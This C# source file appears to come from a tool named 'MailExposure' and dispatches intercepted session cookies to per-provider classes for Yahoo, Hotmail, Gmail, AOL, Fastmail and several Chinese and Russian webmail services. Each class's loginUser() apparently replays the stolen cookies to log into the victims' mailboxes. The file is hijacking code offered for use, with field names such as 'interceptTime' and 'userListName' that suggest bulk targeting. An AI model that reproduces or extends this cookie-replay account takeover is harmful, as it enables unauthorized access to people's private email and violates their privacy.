using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MailExposure.CookieMailRC
{
    class DisplaceNew : MailStr
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        public int error;
        public string interceptTime;
        public string loginInfo;
        public string NO;
        public string objAddress;
        public string passwdType;
        public string sourceAddress;
        public string strCookies;
        public string strHost;
        public string url;
        public string userListName;
        public string UserName;

        // Methods
        public DisplaceNew()
        {
            this.strCookies = "";
            this.strHost = "";
            this.url = "";
            this.cookieRemarks = "";
        }
        public DisplaceNew(string passwdType, string url, string strCookies, string interceptTime, string userListName, bool Auto, string cookieRemarks)
        {
            this.strCookies = "";
            this.strHost = "";
            this.url = "";
            this.cookieRemarks = "";
            this.interceptTime = interceptTime;
            this.passwdType = passwdType;
            this.url = url;
            this.strCookies = strCookies;
            this.userListName = userListName;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void filter()
        {
            if (this.url.IndexOf("http") == -1)
            {
                this.url = "http://" + this.url.Trim() + "/";
            }
            if (!this.strCookies.EndsWith("; ") && !this.strCookies.EndsWith(";"))
            {
                this.strCookies = this.strCookies + ";";
            }
            if (this.passwdType.ToUpper().IndexOf("YAHOO") != -1)
            {
                new FilterYahoo(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("HOTMAIL") != -1)
            {
                new FilterHotmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("GMAIL") != -1)
            {
                this.url = "http://mail.google.com/mail/";
                new FilterGmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.IndexOf("163") != -1)
            {
                new Filter163mail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("RU") != -1)
            {
                new FilterRumail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("HINET") != -1)
            {
                new FilterHinetmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("126") != -1)
            {
                new Filter126mail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("263") != -1)
            {
                new Filter263mail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("FASTMAIL") != -1)
            {
                new FilterFastmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("TOMMAIL") != -1)
            {
                new FilterTommail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("SINAMAIL") != -1)
            {
                new FilterSinamail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("21CNMAIL") != -1)
            {
                new Filter21CNmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }
            else if (this.passwdType.ToUpper().IndexOf("AOLMAIL") != -1)
            {
                new FilterAolmail(this.url, this.strCookies, this.interceptTime, this.userListName, this.Auto, this.cookieRemarks).loginUser();
            }

        }
        public void start()
        {
            string str = DateTime.Now.ToShortTimeString().Substring(0, 2);
            string text1 = "'" + str + "'";
            try
            {
                GlobalValue.mainForm.listBoxView.Items.Add("开始过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                this.filter();
                base.completeThreads();
            }
            catch (Exception exception)
            {
                GlobalValue.mainForm.listBoxView.Items.Add(exception.Message + exception.StackTrace);
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
    }
}
